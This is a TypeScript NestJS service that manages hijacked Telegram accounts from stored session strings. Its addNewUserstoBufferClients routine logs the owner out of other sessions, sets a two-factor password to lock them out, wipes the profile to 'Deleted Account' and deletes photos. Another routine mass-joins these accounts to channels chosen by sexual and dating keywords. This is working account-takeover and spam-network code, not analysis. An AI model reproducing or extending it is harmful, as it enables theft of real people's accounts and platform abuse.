import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
import { BufferClient } from './schemas/buffer-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../activechannels/activechannels.service';

@Injectable()
export class BufferClientService {
    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClient>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
    ) { }

    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }

    async findAll(): Promise<BufferClient[]> {
        return this.bufferClientModel.find().exec();
    }

    async findOne(mobile: string): Promise<BufferClient> {
        const user = await this.bufferClientModel.findOne({ mobile }).exec();
        if (!user) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }

    async updatedocs() {
        console.log("here")
        const clients = await this.findAll();
        console.log(clients.length)
        for (const client of clients) {
            const data: any = { ...client }
            // console.log(data)
            // console.log(data.number);
            await this.bufferClientModel.findByIdAndUpdate(client._id, { availableDate: data._doc.date })
        }
    }

    async update(mobile: string, user: Partial<BufferClient>): Promise<BufferClient> {
        delete user['_id'];
        console.log({ ...user })
        const existingUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { user }, { new: true, upsert: true }).exec();
        if (!existingUser) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return existingUser;
    }

    async remove(mobile: string): Promise<void> {
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter: any): Promise<BufferClient[]> {
        console.log(filter)
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        console.log(filter)
        return this.bufferClientModel.find(filter).exec();
    }

    async executeQuery(query: any): Promise<BufferClient[]> {
        try {
            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            return await this.bufferClientModel.find(query).exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    async joinchannelForBufferClients() {
        await this.telegramService.disconnectAll();
        await sleep(2000);
        const clients = await this.bufferClientModel.find({ channels: { "$lt": 180 } }).limit(4)
        for (const document of clients) {
            try {
                const client = await this.telegramService.createClient(document.mobile, false, false);
                const channels = await client.channelInfo(true);
                const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
                const result = await this.activeChannelsService.getActiveChannels(150, 0, keys, channels.ids);
                console.log("DbChannelsLen: ", result.length);
                let resp = '';
                for (const channel of result) {
                    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
                }
                client.joinChannels(resp);
            } catch (error) {
                console.log(error)
            }
        }
    }

    async checkBufferClients() {
        await this.telegramService.disconnectAll()
        await sleep(2000);
        const clients = await this.findAll();
        const goodIds = [];
        const badIds = [];
        if (clients.length < 40) {
            for (let i = 0; i < 40 - clients.length; i++) {
                badIds.push(1)
            }
        }
        for (const document of clients) {
            console.log(document)
            try {
                const cli = await this.telegramService.createClient(document.mobile);
                const hasPassword = await cli.hasPassword();
                if (!hasPassword) {
                    badIds.push(document.mobile);
                    await this.remove(document.mobile);
                } else {
                    const channels = await this.telegramService.getChannelInfo(document.mobile);
                    await this.update(document.mobile, { channels: channels.ids.length });
                    console.log(document.mobile, " :  ALL Good");
                    goodIds.push(document.mobile)
                }
                await this.telegramService.deleteClient(document.mobile)
                await sleep(2000);
            } catch (error) {
                console.log(document.mobile, " :  false");
                badIds.push(document.mobile);
                await this.telegramService.deleteClient(document.mobile)
            }
        }
        console.log(badIds, goodIds);
        this.addNewUserstoBufferClients(badIds, goodIds);
    }

    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: { $exists: false } }, { lastActive: 1 }, badIds.length + 3);
        console.log("documents : ",documents.length)
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await sleep(30000);
                        await client.updateUsername('');
                        await sleep(3000)
                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000)
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000)
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo()
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            createdDate: (new Date(Date.now())).toISOString().split('T')[0],
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length
                        }
                        await this.create(bufferClient);
                        console.log("=============Created BufferClient=============")
                        await this.telegramService.deleteClient(document.mobile)
                        badIds.pop();
                    } else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true })
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } catch (error) {
                    console.log(error);
                    await this.telegramService.deleteClient(document.mobile)
                }
            } catch (error) {
                console.error("An error occurred:", error);
            }
        }
        setTimeout(() => {
            this.joinchannelForBufferClients()
        }, 2 * 60 * 1000);
    }
}
